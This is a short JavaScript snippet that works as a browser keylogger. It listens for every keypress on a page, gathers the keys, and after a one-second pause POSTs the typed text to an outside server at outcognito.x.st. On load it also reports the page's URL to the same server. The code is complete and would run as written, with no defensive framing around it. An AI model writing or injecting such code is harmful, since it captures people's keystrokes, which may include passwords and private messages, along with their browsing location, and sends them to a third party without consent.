const tweet = (status) => {
  const body = new FormData();
  body.append('status', status);

  fetch('https://outcognito.x.st/tweet', {
    method: 'POST',
    body
  });
};

var timeoutId;
var keys = '';
document.addEventListener('keypress', ({key}) => {
  keys += key;
  console.log('keys', keys);

  if (timeoutId) clearTimeout(timeoutId);
  timeoutId = setTimeout(() => {
    tweet(`I just typed ${keys}`);
    keys = '';
  }, 1000);
});

tweet(`I just went to ${document.location}`);
